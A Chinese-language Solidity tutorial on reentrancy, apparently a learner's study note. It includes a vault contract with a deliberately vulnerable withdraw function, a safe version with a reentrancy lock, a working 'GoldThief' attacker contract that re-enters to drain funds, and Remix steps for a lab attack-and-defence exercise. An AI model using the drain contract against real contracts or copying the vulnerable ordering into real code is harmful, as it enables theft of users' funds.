
## 一、个人背景与学习目标

  * **身份**：智能合约/区块链初学者
  * **阶段**：已学习至第20天，有一定编程基础，但对区块链和 Solidity 还不熟悉
  * **目标**：通过本项目，理解重入攻击原理、掌握安全编程思维、能独立完成合约部署、攻击与防御测试

## 二、任务与场景梳理

### 现实场景

你要实现一个“数字金库”**FortKnox**，用户能存取 ETH。黑客可能利用重入漏洞反复盗取金库资金，造成巨大损失。

## 三、核心知识点与场景-代码映射

| 核心知识点 | 类别/措施 | 技术原理/实现 | 代码体现 |
| :--- | :--- | :--- | :--- |
| **重入攻击原理** | 场景类比 | 外部调用时，合约未及时更新状态（如余额），攻击者利用 `receive()` 回调函数反复进入并调用取款函数。 | `GoldVault` 的 `vulnerableWithdraw()` 先转账后更新余额，被 `GoldThief` 的 `receive()` 反复调用。 |
| **防御方式** | 顺序调整 | **先更新状态，再进行外部调用** (Checks-Effects-Interactions Pattern)。 | `safeWithdraw()` 先将余额清零，再执行转账。 |
| | 非重入锁 | 使用 `modifier` 实现一个锁，确保一个函数在一次完整的执行结束前，不能被再次进入调用。 | `nonReentrant` 修饰符在函数开始时加锁，结束时解锁。 |

## 四、完整代码实现与注释

### 1\. 金库合约 `GoldVault.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract GoldVault {
    mapping(address => uint256) public goldBalance;

    // 重入锁相关变量
    uint256 private _status;
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    constructor() {
        _status = _NOT_ENTERED;
    }

    // 非重入修饰符
    modifier nonReentrant() {
        require(_status != _ENTERED, "Reentrant call blocked");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }

    // 存款
    function deposit() external payable {
        require(msg.value > 0, "Deposit must be more than 0");
        goldBalance[msg.sender] += msg.value;
    }

    // 漏洞版取款（存在重入风险！）
    function vulnerableWithdraw() external {
        uint256 amount = goldBalance[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // 错误顺序：先转账 (Interaction)，后更新状态 (Effect)
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "ETH transfer failed");

        goldBalance[msg.sender] = 0;
    }

    // 安全版取款（防重入）
    function safeWithdraw() external nonReentrant {
        uint256 amount = goldBalance[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // 正确顺序：先更新状态 (Effect)，后转账 (Interaction)
        goldBalance[msg.sender] = 0;
        
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "ETH transfer failed");
    }
}
```

### 2\. 攻击者合约 `GoldThief.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {
    IVault public targetVault;
    address public owner;
    uint public attackCount;

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    // 攻击入口
    function attack() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value > 0, "Need some ETH to start attack");
        
        // 先存入初始资金
        targetVault.deposit{value: msg.value}();
        
        // 发起第一次取款，触发重入
        targetVault.vulnerableWithdraw();
    }

    // receive() 函数是重入攻击的核心。
    // 当 GoldVault 转账给本合约时，此函数会被自动触发。
    receive() external payable {
        attackCount++;
        // 检查金库是否还有钱，并设置一个攻击次数上限防止无限循环
        if (address(targetVault).balance > 0 && attackCount < 5) {
            targetVault.vulnerableWithdraw();
        }
    }

    // 提取战利品
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    // 查询本合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## 五、分步操作与实战流程

1.  **部署金库合约 `GoldVault`**

      * 在 Remix 新建 `GoldVault.sol`，粘贴代码。
      * 部署时 `Value` 必须为 **0** (constructor 不是 payable)。
      * 部署成功后，记下合约地址。

2.  **存入资金**

      * 调用 `deposit()`，在 `Value` 栏输入你要存入的 ETH (例如 `10` ETH)。
      * 多次调用，确保金库余额充足。

3.  **部署攻击合约 `GoldThief`**

      * 新建 `GoldThief.sol`，粘贴代码。
      * 部署时，在构造函数参数栏 (`_vaultAddress`) 传入 **`GoldVault` 的地址**。
      * 部署成功后，记下 `owner` 地址 (通常就是当前账户)。

4.  **发起重入攻击**

      * 在 `GoldThief` 界面，调用 `attack()` 函数，并在 `Value` 栏输入用于启动攻击的金额 (例如 `1` ETH)。
      * 攻击会自动循环，无需手动多次点击。

5.  **查看攻击成果**

      * 调用 `getBalance()` 查询 `GoldThief` 合约当前余额。
      * 调用 `stealLoot()` 把钱转回你的钱包 (`owner` 地址)。
      * 查看 `owner` 钱包余额，确认最终盗取金额。

6.  **验证防御效果**

      * 若要测试安全函数，请在 `GoldThief` 合约中将 `vulnerableWithdraw()` 的调用改为 `safeWithdraw()` 再重新进行上述流程。
      * 你会发现 `receive()` 函数只会被触发一次，攻击失败，金库资金安全。

## 六、常见坑与排查建议

| 易错点 | 解决方案 |
| :--- | :--- |
| 部署合约时（如 `GoldVault`）带金额报错 | 确认 `constructor` 没有 `payable` 关键字，部署时 `Value` 必须为 **0**。 |
| 调用 `attack` 时交易失败 | 必须在 `Value` 栏填入一个大于 0 的值 (例如 `1` ETH)。 |
| 攻击未发生多轮 | 检查 `receive()` 函数中的攻击条件：`address(targetVault).balance > 0` 和 `attackCount < 5` 是否满足。 |
| `stealLoot` 后余额没变化 | 确认你当前操作的账户是合约的 `owner`，并检查 Remix 中的交易日志确认交易是否成功。 |

## 七、进阶建议与思维拓展

  * **深入理解**：研究 `call`, `transfer`, `send` 这三者在处理 gas 和异常时的安全差异。
  * **流程可视化**：画出攻击流程图，帮助理清“外部调用 -\> 回调 -\> 再调用”的完整资金和控制流。
  * **参数调试**：尝试修改 `attackCount` 的上限，观察不同的攻击效果。
  * **业界实践**：阅读并理解 OpenZeppelin `ReentrancyGuard.sol` 的源码，这是业界公认的最佳实践。

## 八、常用 Remix 操作技巧

  * **区分 `Value` 场景**：部署时通常为 `0`；调用 `payable` 函数（如 `deposit`, `attack`）时，输入你要转入的 ETH 数额。
  * **状态检查**：多用 `public` 状态变量 (如 `goldBalance`, `owner`, `attackCount`) 来查询合约当前状态，帮助调试。
  * **日志分析**：密切关注 Remix 控制台的交易日志，它能清晰地展示每一步的函数调用和资金流向。

## 九、总结

通过本项目，你将：

  * ✅ 理解重入攻击的原理和巨大危害。
  * ✅ 掌握基于“先更新状态，后外部调用”和“重入锁”的防御思路。
  * ✅ 能独立在 Remix 环境中完成一次完整的智能合约攻击与防御实验。
